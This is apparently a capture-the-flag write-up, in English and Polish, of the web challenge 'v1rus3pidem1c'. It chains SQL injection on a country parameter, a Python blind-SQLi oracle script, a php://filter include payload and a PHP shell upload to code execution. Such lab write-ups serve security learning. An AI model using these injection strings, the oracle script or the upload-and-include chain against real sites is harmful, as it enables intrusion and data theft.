# v1rus3pidem1c (web 100)

## eng
[pl](#pl-version)

in the task we get a webpage where we can select a country from dropdown and for some countries this shows us file upload form and for some of them it doesn't.
for example there is a form for `germany` and no form for `russia`.

the country name is passed as get parameter in the query, and we decide to see what exactly is done with it.
a little bit of fuzzing tells us that it goes into some sql query into where condition.

with classic `country=russia' or '1'='1` we get a form for germany, which means we managed to exploit the task with sql injection.

we tried a bit to get some echo here, but couldn't, so we simply switched to run blind sqli attack.
we got a simple oracle function:

```
import requests
session = requests.session()

def is_true(condition):
    url = "http://tasks.ctf.com.ua:13372/index.php?country=russia' or (%s) -- a" % condition
    result = session.get(url)
    return 'virus for germany' in result.text


def main():
    print(is_true("1=1"))
    print(is_true("1=0"))


main()
```

and with this we can extract `information_schema.tables` and `information_schema.columns` data, with simple substring and byte-by-byte comparison using the oracle function.

this tells us there we have only a single user defined table and it contains only `countryid, countryname, scriptpath`.
last parameter is especially interesting since it's an actual path to php script with form, which gets included on the page.
it's in form: `country/ge.php`, `country/tu.php` etc.

we could use our sqli to include some other file by `index.php?country=' union select 'somefile.php' -- comment`, but we can't put any file on the server.
but since we control the include path we decided to check good old php wrappers and force the server to include: `php://filter/read=convert.base64-encode/resource=country/ge.php` and as expected we get a nice base64 contents of the php script.

it seems that the files uploaded by the form available for some countries actually get uploaded to the server!
we have there for example:

```php
<?php

	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_files["filetoupload"]["name"]);
	move_uploaded_file($_files["filetoupload"]["tmp_name"], $target_file);
	
	/*echo $_files["filetoupload"]["tmp_name"] ."\n";
	var_dump($_files["filetoupload"]);
	var_dump(file_exists($_files["filetoupload"]["tmp_name"]));
	echo file_exists($target_file);*/
?>
```

so it's clear that we can use this form to upload a php shell to the server and then use sqli to include it on the page and execute, because we know the file will be under `uploads/file_name`.

we proceed with this and find a hidden php file with flag: `h4ck1t{$ql&lfi=fr13nd$}`

## pl version

w zadaniu dostajemy link do strony internetowej gdzie możemy wybrać z listy jeden z krajów i dla niektórych pojawia się formularz uploadu plików a dla innych nie.

na przykład dla `germany` mamy formularz a dla `russia` nie.

nazwa kraju jest przesyłana jako parametr get i spróbowaliśmy przetestować co się może dziać z tym parametrem.
troche fuzzowania pokazało że parametr idzie bezpośrednio do query sql do warunku where.

klasycznym `country=russia' or '1'='1` dostaliśmy formular dla niemiec, co znaczy że mamy tam sql injection.

próbowalismy dostać tam gdzieś echo, ale bez skutku, więc postanowiliśmy użyć blind sqli.
przygotowalismy prostą funkcje:

```
import requests
session = requests.session()

def is_true(condition):
    url = "http://tasks.ctf.com.ua:13372/index.php?country=russia' or (%s) -- a" % condition
    result = session.get(url)
    return 'virus for germany' in result.text


def main():
    print(is_true("1=1"))
    print(is_true("1=0"))


main()
```

i możemy dzięki temu pobrać z `information_schema.tables` i `information_schema.columns` dane poprzez proste substring oraz porównywanie wartości bajt po bajcie za pomocą funkcji oracle.

stąd wiemy, że jest tylko jedna tabela użytkownika i zawiera `countryid, countryname, scriptpath`.

ostatni parametr jest szczególnie ciekawy bo zawiera ścieżkę do plików php, które są includowane na stronie.

mają postać: `country/ge.php`, `country/tu.php` etc.

moglibyśmy użyć naszego sqli żeby includować jakiś inny plik przez `index.php?country=' union select 'somefile.php' -- comment` ale nie możemy póki co umieścić niczego na serwerze.

niemniej skoro kontrolujemy ścieżkę do include to może stare dobre wrappery php zadziałają i czy serwer pozwoli includować: `php://filter/read=convert.base64-encode/resource=country/ge.php` i tak jak na to liczylismy, dostaliśmy ładne base64 z kodu skryptu.

analiza kodu pozwala stwierdzić, że możemy uploadować pliki na serwer za pomocą skryptów dla niektórych krajów!
mamy tam:

```php
<?php

	$target_dir = "uploads/";
	$target_file = $target_dir . basename($_files["filetoupload"]["name"]);
	move_uploaded_file($_files["filetoupload"]["tmp_name"], $target_file);
	
	/*echo $_files["filetoupload"]["tmp_name"] ."\n";
	var_dump($_files["filetoupload"]);
	var_dump(file_exists($_files["filetoupload"]["tmp_name"]));
	echo file_exists($target_file);*/
?>
```

widać wyraźnie, że mozemy spokojnie wrzucić za pomocą formularza shell php na serwer i użyć sqli żeby go includować i użyć, bo wiemy że jest dostępny pod `uploads/file_name`.

umieszczamy więc nasz shell i odnajdujemy ukryty plik php z flagą: `h4ck1t{$ql&lfi=fr13nd$}`
